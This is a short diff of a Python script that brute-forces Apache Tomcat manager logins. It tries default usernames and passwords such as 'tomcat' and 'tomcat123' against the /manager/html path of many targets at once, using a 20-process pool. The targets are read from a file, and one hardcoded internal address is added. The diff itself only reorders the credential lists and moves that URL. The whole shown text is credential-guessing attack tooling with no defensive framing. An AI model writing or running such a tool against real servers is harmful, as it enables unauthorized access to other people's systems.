@@ -8,8 +8,8 @@ from multiprocessing import Pool
 import re
 
 def brute_force(target):
-    unames = ['tomcat', 'admin', 'role1']
-    pwds = ['123456', '12345', 'tomcat', 'tomcat123']
+    unames = ['tomcat', 'admin']
+    pwds = ['tomcat', 'tomcat123', '123456', '12345']
     url = target + '/manager/html'
 
     for uname in unames:
@@ -29,11 +29,11 @@ def brute_force(target):
 if __name__ == '__main__':
 
     urls = []
+    urls.append('http://10.223.2.60:9090')
     for line in open(sys.argv[1]):
         line = line.strip()
         urls.append(line)
 
-    urls.append('http://10.223.2.60:9090')
     #print urls
     pool = Pool(20)
     pool.map(brute_force, urls)
